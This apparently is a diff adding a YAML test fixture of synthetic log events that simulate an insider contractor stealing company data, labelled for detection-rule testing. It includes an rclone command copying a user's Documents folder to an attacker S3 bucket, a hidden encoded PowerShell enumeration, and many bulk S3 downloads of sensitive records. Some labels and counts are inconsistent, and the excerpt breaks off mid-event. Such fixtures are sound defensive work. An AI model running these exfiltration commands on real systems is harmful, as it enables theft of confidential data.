@@ -1,0 +1,1513 @@
+events:
+- description: Contractor off-hours login from Romania — no MFA, unregistered device
+  malicious: true
+  scenario: insider_stage_1
+  expected_detection: Insider.EntraID.OffHours.AnomalousLogin
+  event:
+    p_log_type: Azure.Audit
+    category: SignInLogs
+    operationName: Sign-in activity
+    Level: Informational
+    callerIpAddress: 185.220.101.47
+    correlationId: entra-insider-001
+    properties:
+      createdDateTime: '2026-05-22T02:15:00Z'
+      userPrincipalName: contractor.jsmith@corp.xyzcompany.com
+      userDisplayName: James Smith (Contractor)
+      ipAddress: 185.220.101.47
+      status:
+        errorCode: 0
+        failureReason: null
+      conditionalAccessStatus: notApplied
+      authenticationDetails:
+      - authenticationMethod: Password
+        succeeded: true
+      deviceDetail:
+        deviceId: ''
+        displayName: ''
+        operatingSystem: Windows 10
+        browser: Chrome 120.0
+      location:
+        city: Bucharest
+        countryOrRegion: RO
+        geoCoordinates:
+          latitude: 44.43
+          longitude: 26.1
+      riskDetail: none
+      riskLevelAggregated: none
+      clientAppUsed: Browser
+- description: Rclone cloud sync tool executed — data staging to external storage
+  malicious: true
+  scenario: insider_stage_2
+  expected_detection: EDR.UDM.Reverse.Shell.Tool.Execution
+  event:
+    p_log_type: SentinelOne.DeepVisibilityV2
+    account.id: xyzcompany-s1-account-01
+    event.time: 0
+    event.type: ProcessCreation
+    event.category: process
+    src.process.name: rclone.exe
+    src.process.cmdline: rclone.exe copy C:\Users\jsmith\Documents s3:exfil-staging-bucket-attacker/stolen --transfers 32
+      --config C:\Users\jsmith\AppData\Roaming\rclone\rclone.conf
+    src.process.image.path: C:\Users\jsmith\Downloads\rclone.exe
+    src.process.image.sha256: d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5
+    src.process.user: BEAZLEY\contractor.jsmith
+    src.process.pid: 9901
+    src.process.parent.name: explorer.exe
+    src.process.parent.image.path: C:\Windows\explorer.exe
+    src.process.parent.pid: 3104
+    src.process.storyline.id: INSIDER-2026
+    network.destination.ip: 185.220.101.47
+    network.destination.port: 443
+    tgt.process.name: ''
+    endpoint.name: WKSTN-CONTRACT-01
+    endpoint.os: windows
+    agent.uuid: s1-agent-xyzcompany-contract-01
+    site.name: corp.xyzcompany.com
+- description: Encoded PowerShell — enumerating and staging sensitive files
+  malicious: true
+  scenario: insider_stage_2
+  expected_detection: EDR.UDM.Base64.Encoded.Cmdline
+  event:
+    p_log_type: SentinelOne.DeepVisibilityV2
+    account.id: xyzcompany-s1-account-01
+    event.time: 0
+    event.type: ProcessCreation
+    event.category: process
+    src.process.name: powershell.exe
+    src.process.cmdline: powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -enc RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcAFUAcwBlAHIAcwBcAGoAcwBtAGkAdABoAFwARABvAGMAdQBtAGUAbgB0AHMAIAAtAFIAZQBjAHUAcgBzAGUA
+    src.process.image.path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    src.process.image.sha256: c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4
+    src.process.user: BEAZLEY\contractor.jsmith
+    src.process.pid: 8844
+    src.process.parent.name: rclone.exe
+    src.process.parent.image.path: C:\Users\jsmith\Downloads\rclone.exe
+    src.process.parent.pid: 9901
+    src.process.storyline.id: INSIDER-2026
+    tgt.process.name: ''
+    endpoint.name: WKSTN-CONTRACT-01
+    endpoint.os: windows
+    agent.uuid: s1-agent-xyzcompany-contract-01
+    site.name: corp.xyzcompany.com
+- description: AssumeRole from attacker IP using contractor credentials
+  malicious: false
+  scenario: insider_stage_3
+  expected_detection: ''
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: AssumeRole
+    eventSource: sts.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      roleArn: arn:aws:iam::123456789012:role/ContractorDataAccess
+      roleSessionName: contractor-session
+      durationSeconds: 3600
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+- description: 'S3 GetObject bulk download #1 — financial records staging (1 of 50)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-financial-records-prod
+      key: 2024/Q4/financial_summary.xlsx
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #2 — financial records staging (2 of 50)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-financial-records-prod
+      key: 2024/Q4/client_contracts.zip
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #3 — HR records staging (3 of 50)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-hr-records-prod
+      key: 2024/employee_salary_data.csv
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #4 — IP staging (4 of 50)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0
+    requestParameters:
+      bucketName: corp-ip-documents-prod
+      key: designs/product_roadmap_2025.pdf
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #5 — source code staging (5 of 50)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0
+    requestParameters:
+      bucketName: corp-source-code-prod
+      key: platform/core/auth_service.zip
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: S3 PutObject to cross-account exfil bucket — data exfiltration
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.CrossAccount.Exfiltration
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: PutObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: exfil-staging-bucket-attacker
+      key: stolen/beazley_financial_data.zip
+      bucketAccountId: '999888777666'
+    responseElements:
+      x-amz-id-2: example-id
+      x-amz-request-id: example-req
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: false
+    managementEvent: false
+- description: 'S3 GetObject bulk download #6 — data staging (6 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-financial-records-prod
+      key: 2024/Q3/revenue_report.xlsx
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #7 — data staging (7 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-financial-records-prod
+      key: 2024/Q3/expense_report.xlsx
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #8 — data staging (8 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-financial-records-prod
+      key: 2023/Q4/audit_report.pdf
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #9 — data staging (9 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-financial-records-prod
+      key: 2024/Q2/board_presentation.pptx
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #10 — data staging (10 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-financial-records-prod
+      key: 2024/Q1/budget_forecast.xlsx
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #11 — data staging (11 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-hr-records-prod
+      key: 2024/headcount_report.csv
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #12 — data staging (12 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-hr-records-prod
+      key: 2024/compensation_bands.xlsx
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #13 — data staging (13 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-hr-records-prod
+      key: 2024/performance_reviews.zip
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #14 — data staging (14 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-hr-records-prod
+      key: 2023/org_chart.pdf
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #15 — data staging (15 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-hr-records-prod
+      key: 2024/contractor_roster.xlsx
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #16 — data staging (16 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-ip-documents-prod
+      key: designs/architecture_v3.pdf
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #17 — data staging (17 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-ip-documents-prod
+      key: designs/patent_filings_2024.zip
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #18 — data staging (18 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-ip-documents-prod
+      key: research/market_analysis_q4.pdf
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #19 — data staging (19 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-ip-documents-prod
+      key: designs/ui_wireframes.zip
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #20 — data staging (20 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-ip-documents-prod
+      key: research/competitor_analysis.xlsx
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #21 — data staging (21 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-source-code-prod
+      key: platform/billing/billing_service.zip
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #22 — data staging (22 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-source-code-prod
+      key: platform/identity/auth_tokens.zip
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #23 — data staging (23 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-source-code-prod
+      key: platform/core/database_schema.sql
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #24 — data staging (24 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-source-code-prod
+      key: platform/api/api_keys_config.zip
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #25 — data staging (25 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-source-code-prod
+      key: platform/infra/terraform_state.zip
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #26 — data staging (26 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-legal-docs-prod
+      key: contracts/vendor_agreements_2024.zip
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #27 — data staging (27 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-legal-docs-prod
+      key: contracts/client_msa_templates.zip
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #28 — data staging (28 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-legal-docs-prod
+      key: litigation/case_notes_2024.pdf
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #29 — data staging (29 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-legal-docs-prod
+      key: compliance/sox_audit_2024.pdf
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #30 — data staging (30 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
+    eventVersion: '1.08'
+    eventType: AwsApiCall
+    awsRegion: us-east-1
+    sourceIPAddress: 185.220.101.47
+    userAgent: aws-cli/2.13.0 Python/3.11.0 Linux/5.15.0
+    requestParameters:
+      bucketName: corp-legal-docs-prod
+      key: contracts/nda_signed_copies.zip
+    responseElements: null
+    userIdentity:
+      type: IAMUser
+      principalId: AIDACONTRACTORID
+      arn: arn:aws:iam::123456789012:user/contractor-jsmith
+      accountId: '123456789012'
+      userName: contractor-jsmith
+    readOnly: true
+    managementEvent: false
+- description: 'S3 GetObject bulk download #31 — data staging (31 of 55)'
+  malicious: true
+  scenario: insider_stage_3
+  expected_detection: Insider.AWS.S3.BulkDataAccess.Staging
+  event:
+    p_log_type: AWS.CloudTrail
+    eventName: GetObject
+    eventSource: s3.amazonaws.com
